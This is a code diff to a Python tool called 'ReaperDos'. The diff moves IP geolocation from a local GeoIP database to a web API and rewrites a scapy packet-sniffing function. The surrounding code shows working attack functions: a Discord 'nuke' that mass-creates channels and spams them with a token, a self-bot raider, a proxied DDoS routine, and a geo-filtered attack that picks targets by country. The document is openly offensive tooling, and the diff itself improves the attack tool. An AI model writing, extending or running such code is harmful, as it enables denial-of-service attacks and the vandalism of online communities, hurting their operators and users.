@@ -15,7 +15,6 @@ from aiohttp_socks import ProxyConnector
 from scapy.all import *
 from colorama import init, Fore, Style
 from datetime import datetime
-import geoip2.database
 import json
 import csv
 import discord
@@ -39,7 +38,7 @@ logger = logging.getLogger(__name__)
 # ReaperDos configuration
 RENDER_URL = 'https://slibidybababab.onrender.com'
 TIMEOUT = 5
-GEOIP_DB = 'GeoLite2-Country.mmdb'
+GEOIP_API_URL = 'https://ipapi.co/{}/json/'  # Web API for IP geolocation
 PROXY_FILE = 'Free_Proxy_List.txt'
 
 # Set terminal title to "ReaperDos" based on platform
@@ -322,7 +321,7 @@ async def nuke_attack(proxy_manager, token, server_id, duration):
                     for _ in range(15):
                         await new_channel.send(message)
                         logger.info(f"Sent message in {new_channel.name}")
-                        await asyncio.sleep(0.5)  # Rate limit
+                        await asyncio.sleep(0.5)
                     await asyncio.sleep(1)
                 except Exception as e:
                     logger.error(f"Failed to create/spam channel: {str(e)}")
@@ -639,15 +638,19 @@ async def custom_raider_attack(proxy_manager, token, invite_link, message):
         print(f"{Fore.RED}Failed to start self-bot: {str(e)}{Style.RESET_ALL}")
 
 def ip_lookup(ip):
-    """Perform IP geolocation lookup using GeoIP2"""
+    """Perform IP geolocation lookup using ipapi.co API"""
     try:
-        reader = geoip2.database.Reader(GEOIP_DB)
-        response = reader.country(ip)
-        result = {'ip': ip, 'country': response.country.name, 'iso_code': response.country.iso_code}
-        reader.close()
-        logger.info(f"IP lookup for {ip}: {result}")
-        return result
-    except Exception as e:
+        response = requests.get(GEOIP_API_URL.format(ip), timeout=TIMEOUT)
+        response.raise_for_status()
+        data = response.json()
+        if data.get('error'):
+            return {'ip': ip, 'error': data['reason']}
+        return {
+            'ip': ip,
+            'country': data.get('country_name'),
+            'iso_code': data.get('country_code')
+        }
+    except requests.exceptions.RequestException as e:
         logger.error(f"IP lookup failed: {str(e)}")
         return {'ip': ip, 'error': str(e)}
 
@@ -686,29 +689,18 @@ async def proxy_speed_test(proxy_manager):
     logger.info(f"Proxy speed test completed: {len(results)} proxies tested")
     return results
 
-def packet_analysis(interface="eth0", count=100):
-    """Capture and analyze packets using scapy"""
-    print(f"{Fore.YELLOW}Capturing {count} packets on {interface}...{Style.RESET_ALL}")
-    try:
-        packets = sniff(iface=interface, count=count, timeout=30)
-        result = {'packets_captured': len(packets), 'protocols': [pkt.sprintf("%IP.proto%") for pkt in packets if IP in pkt]}
-        logger.info(f"Packet analysis completed: {len(packets)} packets captured")
-        return result
-    except Exception as e:
-        logger.error(f"Packet analysis failed: {str(e)}")
-        return {'error': str(e)}
-
 def geo_filter_attack(proxy_manager, target, country_code, duration):
-    """Perform geo-filtered attack"""
+    """Perform geo-filtered attack using web API"""
     try:
-        reader = geoip2.database.Reader(GEOIP_DB)
-        response = reader.country(target)
-        if response.country.iso_code == country_code.upper():
-            print(f"{Fore.YELLOW}Starting geo-filtered attack on {target} (Country: {country_code}) for {duration}s...{Style.RESET_ALL}")
+        geo_data = ip_lookup(target)
+        if 'error' in geo_data:
+            print(f"{Fore.RED}Geo filter failed: {geo_data['error']}{Style.RESET_ALL}")
+            return
+        if geo_data.get('iso_code', '').upper() == country_code.upper():
+            print(f"{Fore.YELLOW}Starting geo-filtered attack on {target} (Country: {geo_data['country']}) for {duration}s...{Style.RESET_ALL}")
             asyncio.run(ddos_attack(proxy_manager, target, duration, attack_type="geo"))
         else:
             print(f"{Fore.RED}Target {target} is not in {country_code}{Style.RESET_ALL}")
-        reader.close()
     except Exception as e:
         logger.error(f"Geo filter attack failed: {str(e)}")
         print(f"{Fore.RED}Geo filter attack failed: {str(e)}{Style.RESET_ALL}")
@@ -743,6 +735,19 @@ def view_logs():
     except FileNotFoundError:
         print(f"{Fore.RED}No logs found{Style.RESET_ALL}")
     logger.info("Logs viewed")
+
+def packet_analysis(interface, count):
+    """Perform packet analysis using scapy"""
+    try:
+        print(f"{Fore.YELLOW}Starting packet capture on {interface} for {count} packets...{Style.RESET_ALL}")
+        packets = sniff(iface=interface, count=count, timeout=TIMEOUT)
+        summary = [pkt.summary() for pkt in packets]
+        result = {'interface': interface, 'captured': len(packets), 'summary': summary}
+        logger.info(f"Packet analysis on {interface}: {result}")
+        return result
+    except Exception as e:
+        logger.error(f"Packet analysis failed: {str(e)}")
+        return {'interface': interface, 'error': str(e)}
 
 async def main():
     """Main ReaperDos function"""
